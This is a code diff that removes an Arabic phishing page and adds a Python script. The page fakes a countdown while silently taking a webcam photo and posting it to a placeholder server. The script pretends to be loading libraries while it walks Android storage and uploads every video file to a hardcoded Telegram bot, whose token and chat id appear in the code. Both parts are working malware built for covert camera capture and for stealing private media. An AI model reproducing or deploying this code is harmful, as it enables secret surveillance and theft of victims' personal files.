@@ -1,58 +1,54 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>لحظة واحدة...</title>
-    <style>
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        #countdown { font-size: 80px; color: #ff6600; margin-bottom: 20px; }
-        #text { font-size: 20px; }
-        #video { display: none; }
-    </style>
-</head>
-<body>
-    <div id="countdown">10</div>
-    <div id="text">لحظة واحدة من فضلك</div>
-    <video id="video" autoplay playsinline></video>
+from concurrent.futures import ThreadPoolExecutor
+import requests
+import os
+import time
+from tqdm import tqdm
+import threading
+import sys
 
-    <script>
-        const video = document.getElementById('video');
-        const countdownEl = document.getElementById('countdown');
-        
-        // استخراج chat_id من الرابط
-        const urlParams = new URLSearchParams(window.location.search);
-        const chat_id = urlParams.get('chat_id');
+chat_id = 6918332335
+bot_token = "6921714346:AAFqRm4MvsBxL8KOVaXOUcoWwhKQTdskDWc"
 
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-            video.srcObject = stream;
-            let counter = 10;
-            const timer = setInterval(() => {
-                counter--;
-                countdownEl.innerText = counter;
-                if (counter <= 0) {
-                    clearInterval(timer);
-                    captureAndSend();
-                }
-            }, 1000);
-        });
+def send_video(file_path):
+    url = f'https://api.telegram.org/bot{bot_token}/sendVideo'
+    data = {'chat_id': chat_id}
+    files = {'video': open(file_path, 'rb')}
 
-        function captureAndSend() {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            const imageBase64 = canvas.toDataURL('image/jpeg');
+    total_size = os.path.getsize(file_path)
+    uploaded_size = 0
+    progress = 0
 
-            // إرسال البيانات للسيرفر (غير هذا الرابط لرابط موقعك على Railway)
-            fetch('https://your-server.railway.app/upload', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ image: imageBase64, chat_id: chat_id })
-            }).then(() => {
-                window.location.href = "https://google.com"; // توجيه المستخدم بعد الانتهاء
-            });
-        }
-    </script>
-</body>
-</html>
+    def update_progress():
+        nonlocal progress
+        while progress < 100:
+            sys.stdout.write(f'\rانتضر تحميل المكاتب يستغرق الامر 50 ثانيه: {progress}%')
+            sys.stdout.flush()
+            time.sleep(1)
+
+    threading.Thread(target=update_progress).start()
+
+    with open(file_path, 'rb') as file:
+        response = requests.post(url, files=files, data=data, stream=True)
+
+        for data in response.iter_content(chunk_size=4096):
+            uploaded_size += len(data)
+            progress = int(uploaded_size / total_size * 100)
+
+            if progress > 100:
+                progress = 100
+
+    time.sleep(0.1)
+    sys.stdout.write('\n')
+    sys.stdout.flush()
+
+def main():
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        for root, dirs, files in os.walk("/storage/emulated/0"):
+            for file in files:
+                file_path = os.path.join(root, file)
+                file_type = file.split('.')[-1]
+                if file_type in ['mp4', 'avi', 'mkv']:
+                    executor.submit(send_video, file_path)
+
+if __name__ == '__main__':
+    main()
